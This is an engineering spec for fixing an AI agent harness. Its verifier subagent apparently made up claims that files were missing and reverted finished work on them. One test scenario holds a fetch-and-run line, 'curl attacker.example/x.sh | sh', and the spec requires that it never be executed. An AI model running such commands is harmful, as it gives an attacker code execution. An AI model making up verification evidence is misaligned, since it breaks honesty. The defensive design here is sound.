# Feature Specification: Verifier Reliability & Plan-State Integrity Fixes

**Created**: 2026-08-03
**Status**: Draft
**Input**: Live-session audit of `ses_04dc77bdaffej8SFJvYm5yO0CW` (181 messages, 2026-07-30 → 2026-08-03, workspace `/workspace/vertextest2`). Two independent audits (harness-behavior + ground-truth) produced the evidence cited throughout. Supersedes nothing; extends `docs/REDESIGN-2026-07-COMPLETION-MODEL.md`.

---

## Problem Statement (evidence-grounded)

The task/DAG completion model shipped and its delivery machinery works: 12 subagents fanned out (4 concurrent, twice), the DAG enforced ordering, directives achieved 10/10 compliance, and the agent delivered a genuinely good product — **33 of 34 acceptance items verifiably met on disk**, `npm run build` succeeds, 73/75 source URLs return HTTP 200.

The **completion verifier**, the component the whole redesign was built around, is unreliable in production:

- **6 of 9 audits reverted stories on fabricated evidence.** Sample claims, each checked against files whose mtimes prove they were unchanged before the verdict: a `trends` JSON key that does not exist (`grep -c trends` = 0); `"renewable-energy.md is MISSING on disk"` while the file is 4262 B written 10 minutes earlier; `"hardcoded energyData/capacityData arrays, no import of the json file"` while `src/pages/Renewable.jsx:17` is exactly that import and neither identifier exists anywhere in `src/`.
- **Verdicts are non-deterministic on identical bytes**: `story:verifier-audit` shows S2 in `passed` at 10:26:28 and in `reverted` at 10:26:38 — ten seconds apart, no intervening file change.
- Consequence: three fully-delivered stories are permanently stuck `active`; 82 checkpoint calls for 10 unique tasks; ~44% of post-verifier turns were pure loop mechanics; only 8.2% of turns mutated a file.

Separately, **plan state is silently lost** under concurrent plugin instances, and four smaller defects make the revert→re-claim contract unsatisfiable or unauditable.

**Governing principle for this spec**: the harness must never treat an unverified LLM assertion as authoritative when a deterministic check is available and disagrees. Every fix below is subordinate to the repo's existing fail-open convention — a harness bug must degrade to pre-fix behavior, never wedge or throw into the host.

---

## Existing Codebase Context

### Symbols Involved

| Symbol | Role | Context |
|--------|------|---------|
| `handleVerifierAudit` (`src/v2/wiring/gate.ts:673`) | modifies | The arbiter stage. Selects unverifiedStories stories (`:679-683`), builds the payload, calls `runVerifier`, filters verdicts to the audit set (`:726`), applies them (`:736`). FR-001/FR-004/FR-007 all land here. |
| `StoryEngine.applyVerifierVerdicts` (`src/v2/story.ts`) | modifies | Stamps `story.verifier` unconditionally, then reverts failed complete-stories. FR-002 adds re-hydrate-before-mutate. |
| `StoryEngine.checkpoint` (`src/v2/story.ts:912-925`) | modifies | Throws `cannot complete task X: it is not active` for a non-active task. FR-003 makes the already-complete case idempotent. |
| `StoryEngine.reopenStory` (`src/v2/story.ts:818`) | modifies | Sets `story.completedAt = undefined`. FR-004 pairs with the audit filter. |
| `StoryEngine.persistPlan` (`src/v2/story.ts:1380`, write at `:1417`) | modifies | `file = { ...file, [sessionID]: current }` from a private in-memory object, under a lock that protects only the write. FR-002. |
| `StoryEngine.getPlan` / `hydrateFromDisk` (`src/v2/story.ts:680`, `:1350`) | modifies | `if (!this.plans.has(sessionID)) this.hydrateFromDisk(...)` — caches forever. FR-002. |
| `isVerifierVerdictShape` (`src/v2/verifier.ts:857-858`) | modifies | Enforces only `pass === true ⟹ all met`. FR-005 adds the converse. |
| `VERIFIER_PLAN_FIELD_CHAR_CAP` (`src/v2/verifier.ts:157`) | modifies | `= 4000`. FR-006. |
| `GateContext.maxNoProgressTurns` (`src/v2/wiring/gate.ts:91`) | calls | Existing stall knob, never fired in the session. FR-007 adds a distinct per-story re-audit cap. |
| `applyV2Config` agent registration (`src/v2/wiring/config.ts:557,564`) | modifies | Registers `maxSteps: 12` / `1`; live host resolves `None`. FR-008. |
| `evaluateStall` / `DelegationTracker` (`src/v2/wiring/watchdog.ts`) | calls | Existing bounded-loop machinery FR-007 mirrors rather than duplicates. |
| `renderPlanDigest` (`gate.ts:600`) | modifies | FR-006 (order + cap), FR-011 (absolute root). *(Added round 2, M-16.)* |
| `VERIFIER_SYSTEM_PROMPT` (`verifier.ts:737`) | modifies | FR-011 — the current text demands observation only before crediting. |
| `scanUnits` / `scanProseField` (`verifier.ts`) | modifies | FR-006a — the no-separator pair join is the reproduced root cause. |
| `promptContinuation` (`gate.ts:103`, `finally` at `:182`) | modifies | FR-012 — mislogged timeout + early guard release. |
| `clearPlan` / `createPlan` / `archiveV1IfPresent` (`story.ts:1294`, `:664`, `:485`) | modifies | FR-002a/b — mutate modes and the non-reentrant lock. |
| `observedCoversPrescribed` (`coverage.ts:1080`) + `plugin.ts:896` | modifies | FR-013 — `join(" && ")` + `every(...)` is why 0 receipts were minted. |

### Impact Assessment

| Symbol Modified | Risk Level | Direct Dependents (d=1) | Indirect (d=2) |
|---|---|---|---|
| `StoryEngine.checkpoint` | **HIGH** | `elicify_vertex_plan_checkpoint` tool, `tests/v2/story.test.ts`, `tests/v2/tools.test.ts`, `scripts/uat-harness.mjs` | Every UAT sequencing scenario; the C-11 invariant test |
| `StoryEngine.persistPlan` / `getPlan` | **HIGH** | Every mutating StoryEngine method | All plan-state tests; on-disk `plan.json` compatibility |
| `handleVerifierAudit` | **MEDIUM** | `handleSessionIdle`, `tests/v2/gate.test.ts`, `tests/v2/integration-verifier.test.ts` | Continuation dispatch, stall accounting |
| `reopenStory` | **MEDIUM** | `elicify_vertex_plan_reopen` tool, gate audit filter | UAT T1 blocked-dependency scenario |
| `isVerifierVerdictShape` | **LOW** | `runVerifier` | `tests/v2/verifier.test.ts` |
| `VERIFIER_PLAN_FIELD_CHAR_CAP` | **LOW** | `buildVerifierPayload` | Payload-size tests |
| `applyV2Config` | **LOW** | `config` hook | `tests/v2/config.test.ts` |

**Flagged for the user**: `checkpoint` and `persistPlan` are HIGH risk — both are load-bearing for the C-11 invariant and for 1379 currently-passing tests. FR-003 and FR-002 each carry an explicit regression requirement below.

### Relevant Execution Flows

| Flow | Relevance |
|---|---|
| `event(session.idle)` → `handleSessionIdle` → `handleVerifierAudit` | Where FR-001, FR-004, FR-007 execute |
| `elicify_vertex_plan_checkpoint` → `StoryEngine.checkpoint` → `persistPlan` | FR-002, FR-003 |
| `runVerifier` → `probeCapabilityBounded` → `runSubturn` | FR-005, FR-006, FR-008 |

### Available Reference Patterns

No `docs/reference/` directory exists in this repo. The in-repo precedents this spec reuses instead:

| Precedent | Pattern | Relevance |
|---|---|---|
| `src/v2/plugin.ts` `computeBoundedDiffStat` | bounded call, try/catch → `""`, never throws | Fail-open SHAPE only. NOTE (round 1, C3): it is `execFileSync("git", argv)` with **no shell**; FR-001 executes nothing at all, so this is a precedent for error handling, not for running commands |
| `src/v2/wiring/watchdog.ts` `evaluateStall` | Pure increment/reset/cap verdict function | FR-007's re-audit cap should be the same shape: pure, testable, no clock |
| `src/v2/pin.ts` `acquireStateLock` | Shared directory lock | FR-002 extends usage to cover read-modify-write, not just write |

---

## User Stories & Acceptance Criteria

### User Story 1 — A path-existence contradiction cannot revert a story (Priority: P2 — re-ranked round 2, C-1)

**RE-SCOPED after grill round 1 (findings 1, 2, 3, 14) — see "Round-1 corrections" below for the evidence that forced each change.**

An engineer needs the harness to refuse one specific, empirically-observed class of fabrication: the verifier asserting that a file or directory does **not** exist when it demonstrably does (`"renewable-energy.md is MISSING on disk"`, `"ls shows no research/ directory"`).

**Coverage, measured (round 2, C-1 — the earlier "100% of observed fabrications" claim was FALSE).** I recovered all 49 item notes from the transcript: **15 path-negation, 29 content-only, 5 mixed**; at story level only **3 of 22** recoverable reverts had *every* failing item be a false non-existence claim. FR-001 therefore addresses a real but minority class. FR-011 (prompt/digest) does the primary work and **FR-005** covers 6 of 22 on its own — hence the re-ranking below.

The original story ("all verifiers pass ⟹ suppress the revert") is **withdrawn**: it is both unsound (a story's verifiers can pass while its acceptance items are genuinely unmet — S1's `test -f *.md` passes on a stub with no `## Sources`, which was one of the 3 CORRECT FAILs) and, as originally specified, inoperative (see the classification table).

**Why this priority (P2, was P0)**: it is the narrowest defensible veto and cannot suppress a correct FAIL, but it covers only 3 of 22 observed reverts. It is a cheap deterministic floor, not the fix. **FR-011 is now P0; FR-005 is P1.**

**Independent Test**: With `research/x.md` present, feed the harness a verifier item `met:false` whose note says that file is missing; assert the item is dropped, `verifier:contradicted` is logged, and — crucially — a sibling item claiming "no sources cited" is NOT dropped.

**Acceptance Scenarios**:

1. **Given** a verifier item `met:false` whose note asserts the non-existence of a path, **And** the harness independently confirms that path exists, **Then** that ITEM MUST be dropped from the applied verdict and `verifier:contradicted` MUST be logged with the story id, the item id and the path.
2. **Given** every `met:false` item of a story is dropped by rule 1, **When** verdicts are applied, **Then** `pass` MUST be re-derived as `true` and the story MUST NOT be reverted.
3. **Given** a story has at least one surviving `met:false` item (any claim that is not a contradicted path-existence claim), **When** verdicts are applied, **Then** the revert MUST proceed exactly as today.
4. **Given** a verifier item asserts a *content* property ("no sources cited", "chart data is hardcoded"), **When** verdicts are applied, **Then** that item MUST NEVER be dropped — content claims are out of scope for this veto.
5. **Given** the existence check itself cannot be performed (unreadable path, permission error), **When** the audit runs, **Then** the harness MUST fall back to today's behavior (apply the verdict) and log the inconclusive check — never wedge, never throw.

**Mechanism (chosen after evaluating three alternatives — see Rejected Alternatives):** existence is established with **`node:fs.existsSync` on a path resolved against the session `workspaceRoot`** — no shell, no `execFileSync`, no author-supplied command execution. Each candidate MUST resolve inside `workspaceRoot` (a `..`-escape or absolute path outside the root is ignored, not checked).

**Discriminator (specified round 2, C-3 — a loose regex is provably unsafe).** I recovered all **49 real item notes** from the session transcript and classified them: **15** path-negation, **29** content-only, **5** mixed. The first notes in the corpus are the trap:

> `research/renewable-energy.md exists (1046 bytes) but contains no URLs or Sources section`

That is a path token adjacent to a negation — on one of the **3 CORRECT FAILs**. Any matcher loose enough to catch *"…md does not exist on disk"* also catches this and would re-derive a pass on a correct failure, destroying the entire rationale for the re-scope. The discriminator is therefore **whitelisted and clause-anchored**, not a token scan:

1. The note MUST match one of a closed set of sentence forms in which the path is the grammatical **subject of the negation**: `<path> (does not exist|is missing|was not found|is not present)` or `(no|missing) <path>` **with no further clause after the path in that sentence**.
2. A note containing **any second negation not attached to the path** (`but contains no…`, `however …no…`) MUST NOT be dropped.
3. A note asserting the path **exists** MUST NOT be dropped, regardless of what else it claims.
4. Multi-path notes (`No src/App.tsx, src/App.jsx, src/main.tsx, or src/main.jsx`) MUST be dropped only when **every** named path exists.
5. Paths appearing inside backticks/quoted commands MUST be ignored (they name a command, not a claim).
6. The implementation MUST be validated against a committed corpus of all 49 recovered notes with a labelled `expected: drop | keep` column; a matcher that drops any of the 3 correct-FAIL notes fails the test suite.

---

### User Story 2 — Plan state survives concurrent plugin instances (Priority: P0)

Two plugin runtimes drove one session and both wrote `plan.json`; a verifier stamp provably written at 10:26:28 is absent from the final file. An operator must be able to trust that a recorded audit result is not silently destroyed by a peer instance.

**Why this priority**: Silent data loss is the most dangerous class of defect here — it is undetectable from inside the session and corrupts the audit record the whole model depends on. It also produced the observed S5 anomaly (`status: complete` carrying a failing stamp).

**Independent Test**: Two `StoryEngine` instances over one `stateDir`; A stamps S1, B (with a stale cache) stamps S2; assert the final file contains BOTH stamps.

**Acceptance Scenarios**:

1. **Given** two StoryEngine instances sharing a `stateDir`, **When** instance B mutates a plan after instance A has written a change B never saw, **Then** the final `plan.json` MUST contain both mutations (B re-hydrates before mutating).
2. **Given** an on-disk plan newer than the in-memory copy, **When** any mutating method runs, **Then** the engine MUST re-read from disk before applying its mutation.
3. **Given** a mutation whose re-read reveals a conflicting concurrent change, **When** the write completes, **Then** a `plan:concurrent-merge` event MUST be logged with the session id.
4. **Given** an unreadable or corrupt `plan.json` on re-hydrate, **When** a mutation runs, **Then** existing corrupt-file behavior is preserved (abort the write, log `story:disk-corrupt`) — never destroy other sessions' entries.

---

### User Story 3 — Re-claiming a reverted task is possible (Priority: P1)

The harness's own revert directive orders "checkpoint each reverted task complete again", but `checkpoint` throws for a non-active task. 23 of 82 checkpoint calls failed this way, leaving the agent in an unsatisfiable loop.

**Why this priority**: An unsatisfiable instruction guarantees wasted turns. Cheap and local to fix, but it cannot precede FR-001 in value because without the cross-check the loop simply spins faster.

**Independent Test**: Checkpoint a task complete twice; assert the second call succeeds as a no-op and `plan.json` is byte-identical.

**Acceptance Scenarios**:

1. **Given** a task already `complete`, **When** it is checkpointed `complete` again, **Then** the call MUST succeed as a no-op, the plan MUST be unchanged, and `checkpoint:idempotent-noop` MUST be logged.
2. **Given** a task that is `pending` (never activated), **When** it is checkpointed `complete`, **Then** the existing error MUST still be thrown (this is a genuine out-of-order claim, not a re-claim).
3. **Given** a task that is `blocked` or `failed`, **When** it is checkpointed `complete`, **Then** the existing error MUST still be thrown — the task must be reopened first.
4. **Given** an idempotent no-op, **When** it returns, **Then** the story's `completedAt` and verifier stamp MUST NOT be altered (no laundering of a failed audit via a repeat claim).

---

### User Story 4 — A reopened story can be audited again (Priority: P1)

`reopenStory` clears `story.completedAt`, and the audit filter requires `completedAt !== undefined` — so a story reopened while `complete` becomes permanently invisible to the verifier. Observed 3× in the session (`previousStatus: complete → newStatus: complete`).

**Why this priority**: A story that can never be re-audited is a silent hole in the completion model — the inverse of FR-001's failure and equally corrosive to trust.

**Independent Test**: Reopen a complete story, re-complete it, run the audit selector; assert the story is selected.

**Acceptance Scenarios**:

1. **Given** a story that was `complete` and is reopened, **When** all its tasks are completed again, **Then** `completedAt` MUST be set and the story MUST be selected by the audit filter.
2. **Given** a reopened story with a prior verifier stamp, **When** it is re-completed, **Then** the audit MUST re-run (the stale stamp MUST NOT suppress it).
3. **Given** a story reopened and then blocked, **When** the audit selector runs, **Then** the story MUST NOT be selected (it is not complete).

---

### User Story 5 — Self-contradictory verdicts are rejected (Priority: P2)

S2's persisted stamp reads `pass:false` with all six items `met:true`, and the harness reverted a story on it. The shape check enforces only one direction.

**Why this priority**: Cheap, purely local, and closes a class of nonsense verdict — but FR-001 already neutralises most of its blast radius.

**Independent Test**: Feed `runVerifier` a verdict with `pass:false` and every item `met:true`; assert `verifier:malformed`.

**Acceptance Scenarios**:

1. **Given** a verdict with `pass:false` and every listed item `met:true`, **When** shape validation runs, **Then** it MUST be rejected as malformed and logged.
2. **Given** a verdict with `pass:false` and at least one item `met:false`, **When** shape validation runs, **Then** it MUST be accepted.
3. **Given** a verdict with `pass:false` and an empty `items` array, **When** shape validation runs, **Then** it MUST be accepted (no per-item claim was made; the verifier may fail a story wholesale).

---

### User Story 6 — The verifier sees the whole plan contract (Priority: P2)

`verifier:field-truncated {plan, originalLength:6425, cap:4000}` fired on all 9 runs, plus `verifier:field-partial-drop {plan, kept:51, dropped:4}`. The verifier then FAILed stories explicitly citing the missing content ("the verifier command is incomplete in the digest", "S5 has no independent verifier set in the digest").

**Why this priority**: A self-inflicted cause of false FAILs, trivially fixed — but bounded by the same payload-hygiene rules that exist for good reason.

**Independent Test**: Build a payload from a 6425-char plan digest; assert no truncation event and the full digest transmitted.

**Acceptance Scenarios**:

1. **Given** a plan digest of 6425 chars, **When** the payload is built, **Then** the full digest MUST be transmitted and no `verifier:field-truncated` event MUST fire for `plan`.
2. **Given** a plan digest exceeding the new cap, **When** the payload is built, **Then** truncation MUST still occur and MUST still be logged (the bound is raised, not removed).
3. **Given** a plan digest containing a secret, **When** the payload is built, **Then** the existing scan-then-truncate redaction MUST still drop it (raising the cap MUST NOT weaken redaction).

---

### User Story 7 — The audit loop terminates (Priority: P1)

9 audit cycles, 82 checkpoints for 10 tasks, ~44% of post-verifier turns pure loop mechanics, 8.2% mutating a file, no escalation, session ended mid-cycle-10. `maxNoProgressTurns` exists but never fired.

**Why this priority**: A bounded failure is recoverable; an unbounded one consumes the whole session. Even with FR-001, a genuinely-disputed story must not loop forever.

**Independent Test**: Drive the same story through N+1 audit reverts; assert the (N+1)th does not revert and escalates instead.

**Acceptance Scenarios**:

1. **Given** a story reverted by the verifier `maxStoryReaudits` times, **When** the next audit would revert it again, **Then** the harness MUST NOT revert; it MUST log `verifier:reaudit-capped` and emit an operator-visible health notification naming the story.
2. **Given** a capped story, **When** a later audit would PASS it, **Then** the pass MUST still apply (the cap suppresses reverts only, never progress).
3. **Given** a real user message arrives, **When** the next audit runs, **Then** the per-story re-audit counter MUST reset (the human has re-engaged).
4. **Given** `maxStoryReaudits <= 0`, **When** audits run, **Then** the cap MUST be disabled (mirrors `evaluateStall`'s existing convention).

---

### User Story 8 — Remove the ineffective `maxSteps` registration (Priority: P3, RESOLVED BY PROBE)

**The original hypothesis is DISPROVEN — see Findings.** `config.ts` registers `maxSteps: 12` (verifier) / `1` (intake) and the live host resolves `None` for both, but a live probe proved the verifier nonetheless runs **three steps and makes real tool calls**. The field is inert, not harmful. What remains is a correctness-of-comment issue: the code asserts a step budget it does not have.

**Why this priority**: Downgraded P1 → P3. Now cosmetic/documentation, not a defect. The real root cause moved to User Story 9 / FR-011.

**Independent Test**: `opencode debug agent vertex-verifier` shows no `maxSteps`; the registration and its comment no longer claim one.

**Acceptance Scenarios**:

1. **Given** the probe findings, **When** the registration is cleaned up, **Then** `maxSteps` MUST either be removed or retained with a comment stating the host ignores it.
2. **Given** the cleanup, **When** the config tests run, **Then** they MUST NOT assert a resolved `maxSteps` value the host does not honour.

---

### User Story 9 — The verifier is compelled to look before it claims (Priority: P0)

A live probe isolated the true cause of the fabrications. Given only the plan digest (bare relative paths, no instruction forcing an observation), the verifier answered from the payload and invented `"ls shows no research/ directory"` for a directory that existed. Given a prompt that named what to check, the same agent called `bash` and `read` and returned a correct verdict. **Identical bytes, opposite verdicts, differing only in prompt specificity.**

**Why this priority**: This is the actual root cause of User Story 1's symptom. FR-001 is the safety net; this is the fix.

**Independent Test**: Re-run the P1 probe (full `runVerifier`, payload only) against the fixture worktree; assert the verdict is correct AND the persisted child-session parts contain ≥1 tool call.

**Acceptance Scenarios**:

1. **Given** a plan digest, **When** it is rendered, **Then** it MUST state the absolute worktree root so every relative path in it is resolvable.
2. **Given** the verifier system prompt, **When** it is issued, **Then** it MUST require at least one filesystem observation before any `met:false` claim about a file's existence or contents.
3. **Given** the P1 fixture (a real file the payload does not quote), **When** the full `runVerifier` path runs, **Then** the verdict MUST be correct and the child session MUST show ≥1 tool call in its persisted parts.

---

### User Story 10 — A continuation that was delivered is not reported as failed (Priority: P1, investigate-then-fix)

*(Added round 1, finding C7.)* `gate:continuation-failed {vertex-v2-continuation-timeout}` fired **9 times** in the audited session — once per audit, at the 30 s `CONTINUATION_TIMEOUT_MS` (`gate.ts:100`). Either every revert directive failed to reach the model (a transport failure no other requirement in this spec addresses), or the harness's own health signal is a chronic false positive that would mask a real outage.

**Why this priority**: if the directives never landed, the entire revert→re-claim analysis is mis-attributed and FR-003's "unsatisfiable contract" is only half the story.

**Independent Test**: dispatch a continuation against a live host, observe whether the prompt is accepted, and compare with what the harness logs.

**Acceptance Scenarios**:

1. **Given** a dispatched continuation, **When** the 30 s race elapses while the host is still streaming the turn, **Then** the harness MUST NOT log it as `gate:continuation-failed` — "still running" is not "rejected".
2. **Given** a continuation the host genuinely refuses, **When** it fails, **Then** `gate:continuation-failed` MUST still fire.
3. **Given** the investigation completes, **When** findings are recorded, **Then** the observed delivery outcome MUST be written into this spec.

---

### User Story 11 — Running a declared verifier actually mints a receipt (Priority: P1)

*(Added round 1, C6b.)* In the audited session the agent repeatedly ran the stories' own declared verifiers and the harness minted **zero** receipts, emitting 146 `verify:relevance-gap` events instead. The prescription is built as `storyVerifiers.join(" && ")` (`plugin.ts:896`) and coverage requires `prescribedParts.every(...)` (`coverage.ts:1097`), so a 6-verifier story only mints if all six run in one command. Absolute-vs-relative path mismatch and `||`-operand dropping compound it.

**Why this priority**: it silently disabled the entire receipt-evidence layer, which is *also* why the safest cross-check design (C6) had no data to use. It is a pre-existing defect the audit surfaced, not a regression from this spec.

**Independent Test**: run one declared verifier of a multi-verifier story; assert a receipt is minted for it.

**Acceptance Scenarios**:

1. **Given** a story declaring 6 verifiers, **When** the agent runs exactly one of them and it passes, **Then** a receipt MUST be minted for that verifier and no `verify:relevance-gap` MUST fire for it.
2. **Given** an observed command using an absolute path and a declared verifier using the equivalent relative path, **When** coverage is evaluated, **Then** they MUST match after normalisation against `workspaceRoot`.
3. **Given** an observed command that covers none of the story's declared verifiers, **When** coverage is evaluated, **Then** `verify:relevance-gap` MUST still fire (the fix must not blanket-accept).

---

### User Story 12 — A verdict the verifier never looked to make is not applied (Priority: P1)

*(Added round 2, M-14.)* FR-001 can only contradict **path** claims, but **29 of the 49** recovered item notes are content claims ("no `## Sources`", "data is hardcoded") — the class FR-001 is forbidden to touch and the class that produced the most damaging fabrication (S4.A1, contradicted by `src/pages/Renewable.jsx:17`). A claim-agnostic floor is needed.

**Why this priority**: it is the only deterministic protection for content fabrications, and it is cheap — the child session's parts are already readable in-process (`client.session.messages` is used at `gate.ts:550`; the session is deleted only in `subturn.ts`'s `finally`).

**Independent Test**: force a verifier verdict produced with zero tool calls; assert `verifier:unverified` and no revert.

**Acceptance Scenarios**:

1. **Given** a verifier child session that made **zero** tool calls, **When** its verdict contains any `met:false`, **Then** the verdict MUST NOT be applied, `verifier:unverified` MUST be logged, and no revert MUST occur.
2. **Given** a verifier child session that made ≥1 tool call, **When** its verdict is applied, **Then** behavior is unchanged.
3. **Given** the child-session parts cannot be read (already deleted, fetch error), **When** the audit runs, **Then** the harness MUST fail open (apply the verdict) and log the inconclusive check.

---

## Edge Cases

| # | Condition | Expected behavior |
|---|---|---|
| E1 | ~~Verifier is a pipeline/`;`-chained~~ | **DELETED (round 2, C-4)** — no command is executed, so exit-code reliability is moot. |
| E2 | ~~Verifier is long-running~~ | **DELETED (round 2, C-4)** — nothing is executed; there is no timeout. |
| E3 | Verifier is destructive (`rm`, `git reset`) | **Moot (round 1, C3)**: the harness never executes `verifiers`. A destructive string sits inert in `plan.json`. |
| E4 | `workspaceRoot` unresolvable | No path check is attempted; verifier verdict applies, logged inconclusive. |
| E5 | Verifier returns verdicts for stories not in the audit set | Existing `verifier:off-target` filter still applies, unchanged |
| E6 | Two instances mutate the SAME story concurrently | Last writer wins for that story's fields, but neither loses the OTHER story's fields; `plan:concurrent-merge` logged |
| E7 | Re-audit cap reached and the story is genuinely undelivered | Escalation surfaces it to the human rather than silently blessing it — the plan stays `active`, never auto-completes |
| E8 | Idempotent re-checkpoint on a task in a story whose verifier FAILED | No-op MUST NOT clear the failing stamp (prevents laundering) |

---

## Behavioral Contract

- When a verifier item claims a path does not exist and that path does exist inside the worktree, the system drops that item and reports a contradiction.
- When every failing item of a story was individually contradicted, the system re-derives a pass; otherwise it reverts as today.
- When a path claim cannot be checked (unresolvable, escapes the worktree), the system applies the verifier verdict and logs the inconclusive check.
- When any plan mutation occurs, the system re-reads on-disk state first and merges rather than overwrites.
- When an already-complete task is re-checkpointed complete, the system succeeds as a no-op without altering completion or audit state.
- When a reopened story is re-completed, the system makes it eligible for audit again.
- When a verdict is internally contradictory, the system rejects it as malformed.
- When the plan digest fits the raised cap, the system transmits it whole; when it exceeds it, the system truncates and says so.
- When a story has been reverted more than the cap allows, the system stops reverting and escalates to the operator.

## Explicit Non-Behaviors

- The system must **not** execute any string that originates from `plan.json` — `verifiers` included. They are LLM-authored, unvalidated (`isStringArray` only), and stored in an ordinary file; executing them unattended would hand code execution to anyone who can write that file or prompt-inject the agent, bypassing the sandbox the verifier subagent itself runs under. *(Round 1, C3.)*
- The system must **not** re-derive a `pass` from a story-level "all verifiers passed" signal, because a story's verifiers can pass while its acceptance items are genuinely unmet — S1's `test -f *.md` passes on a sourceless stub, and "missing `## Sources`" was a CORRECT verifier FAIL. A pass may only be re-derived when **every** failing item was individually disproven. *(Round 1, C2.)*
- The system must **not** drop a verifier item that makes a content claim ("no sources cited", "data is hardcoded"), because a path-existence check cannot speak to content.
- The system must **not** silently drop a verifier verdict it cannot cross-check — every skip must be logged, because an invisible skip is indistinguishable from a pass.
- The system must **not** let an idempotent re-checkpoint clear a failing verifier stamp, because that would let the agent launder a failed audit by re-claiming.
- The system must **not** block, retry, or throw into the host on any cross-check failure — fail-open is absolute.
- The system must **not** raise the plan cap so far that redaction cost becomes unbounded; the existing `VERIFIER_PAYLOAD_RAW_FIELD_SAFETY_CAP` still applies.

## Integration Boundaries

| System | Data in / out | Contract | Failure behavior | Dev approach |
|---|---|---|---|---|
| Filesystem (path-existence check) | Candidate path + `workspaceRoot` → boolean | `fs.existsSync` on a root-confined resolved path; **no process is ever spawned** | Any throw / unresolvable path → inconclusive → verifier verdict applies, logged | Real temp dirs in unit tests |
| opencode host (`session.prompt`, agent resolution) | Verifier subturn request → verdict text | Existing `runSubturn` contract | Existing fail-open union (`unsupported`/`unavailable`/`malformed`) | Stub client in tests; one live probe for FR-008 |
| `plan.json` on disk | Plan object ↔ JSON file | Atomic write + shared `acquireStateLock` | Corrupt → abort write, log, never clobber peers | Real temp-dir fs in tests |

---

## BDD Scenarios

#### Scenario: A contradicted path-existence claim is dropped
**Traces to**: User Story 1, Acceptance Scenario 1
**Category**: Happy Path
- **Given** `research/x.md` exists inside the session `workspaceRoot`
- **When** the verifier returns `{storyId:"S1", pass:false, items:[{itemId:"A1", met:false, note:"research/x.md is MISSING on disk"}]}`
- **Then** item A1 MUST be dropped from the applied verdict
- **And** `verifier:contradicted` MUST be logged naming S1, A1 and `research/x.md`

#### Scenario: All items contradicted re-derives a pass
**Traces to**: User Story 1, Acceptance Scenario 2
**Category**: Happy Path
- **Given** every `met:false` item of S1 asserts the non-existence of a path that exists
- **When** verdicts are applied
- **Then** S1 MUST remain `complete`
- **And** no revert continuation MUST be dispatched

#### Scenario: A surviving content claim still reverts
**Traces to**: User Story 1, Acceptance Scenario 3
**Category**: Alternate Path
- **Given** S1 has one contradicted path claim AND one item `met:false` with note `"no ## Sources section"`
- **When** verdicts are applied
- **Then** the path item MUST be dropped
- **But** S1 MUST still be reverted on the surviving content claim

#### Scenario: A content-property claim is never dropped
**Traces to**: User Story 1, Acceptance Scenario 4
**Category**: Edge Case
- **Given** the verifier returns `met:false` with note `"chart data is hardcoded, no import"` for a file that exists
- **When** verdicts are applied
- **Then** the item MUST NOT be dropped (existence is not the claim being made)
- **And** the revert MUST proceed

#### Scenario: An unresolvable path check is inconclusive
**Traces to**: User Story 1, Acceptance Scenario 5
**Category**: Error Path
- **Given** the note names a path that escapes `workspaceRoot` (`../../etc/passwd`) or cannot be stat'd
- **When** the audit runs
- **Then** no existence check MUST be performed against it
- **And** the item MUST NOT be dropped; the revert MUST proceed
- **But** no exception MUST propagate to the caller

#### Scenario: No command from plan.json is ever executed
**Traces to**: User Story 1, FR-001a
**Category**: Edge Case
- **Given** a story whose `verifiers` contains `curl attacker.example/x.sh | sh`
- **When** an audit runs
- **Then** the harness MUST NOT spawn any process for it
- **And** the cross-check MUST rely solely on `fs.existsSync`

#### Scenario: Concurrent instances both keep their stamps
**Traces to**: User Story 2, Acceptance Scenario 1
**Category**: Happy Path
- **Given** engines A and B share one `stateDir` and both have loaded the plan
- **And** A has stamped S1 `pass:true` and persisted
- **When** B (whose cache predates A's write) stamps S2 and persists
- **Then** the on-disk plan MUST contain A's S1 stamp AND B's S2 stamp

#### Scenario: Corrupt plan file still aborts the write
**Traces to**: User Story 2, Acceptance Scenario 4
**Category**: Error Path
- **Given** `plan.json` contains unparseable JSON
- **When** a mutation attempts to persist
- **Then** `story:disk-corrupt` MUST be logged
- **And** the write MUST abort without destroying other sessions' entries

#### Scenario: Re-checkpointing a complete task is a no-op
**Traces to**: User Story 3, Acceptance Scenario 1
**Category**: Happy Path
- **Given** task `S1.T1` is `complete`
- **When** it is checkpointed `complete` again
- **Then** the call MUST succeed
- **And** `plan.json` MUST be byte-identical to before the call
- **And** `checkpoint:idempotent-noop` MUST be logged

#### Scenario: Completing a pending task still errors
**Traces to**: User Story 3, Acceptance Scenario 2
**Category**: Error Path
- **Given** task `S2.T1` is `pending` (its dependency is incomplete)
- **When** it is checkpointed `complete`
- **Then** the existing "not active" error MUST be thrown

#### Scenario: A no-op re-claim does not launder a failed audit
**Traces to**: User Story 3, Acceptance Scenario 4 (E8)
**Category**: Edge Case
- **Given** story S1 is `complete` with a verifier stamp `pass:false`
- **When** `S1.T1` is re-checkpointed `complete`
- **Then** the failing stamp MUST remain unchanged
- **And** `completedAt` MUST NOT be advanced

#### Scenario: A reopened, re-completed story is audited again
**Traces to**: User Story 4, Acceptance Scenario 1
**Category**: Happy Path
- **Given** story S1 was `complete` and has been reopened
- **When** all of S1's tasks are checkpointed `complete`
- **Then** `S1.completedAt` MUST be set
- **And** the audit selector MUST include S1

#### Scenario: A reopened-then-blocked story is not audited
**Traces to**: User Story 4, Acceptance Scenario 3
**Category**: Edge Case
- **Given** story S1 was reopened and one task is then checkpointed `blocked`
- **When** the audit selector runs
- **Then** S1 MUST NOT be selected

#### Scenario: pass:false with all items met is malformed
**Traces to**: User Story 5, Acceptance Scenario 1
**Category**: Error Path
- **Given** the verifier returns `{storyId:"S2", pass:false, items:[{met:true},{met:true}]}`
- **When** shape validation runs
- **Then** the verdict MUST be rejected as malformed
- **And** `verifier:malformed` MUST be logged

#### Scenario: pass:false with an empty items array is accepted
**Traces to**: User Story 5, Acceptance Scenario 3
**Category**: Edge Case
- **Given** the verifier returns `{storyId:"S2", pass:false, items:[]}`
- **When** shape validation runs
- **Then** the verdict MUST be accepted

#### Scenario: A 6425-char plan digest transmits whole
**Traces to**: User Story 6, Acceptance Scenario 1
**Category**: Happy Path
- **Given** a rendered plan digest of exactly 6425 characters with no secrets
- **When** `buildVerifierPayload` runs
- **Then** `payload.plan` MUST equal the input
- **And** no `verifier:field-truncated` event for `plan` MUST fire

#### Scenario: Plan-contract lines are not silently scan-dropped
**Traces to**: User Story 6, FR-006a
**Category**: Error Path
- **Given** a plan digest whose verifier lines contain no secrets
- **When** `buildVerifierPayload` runs
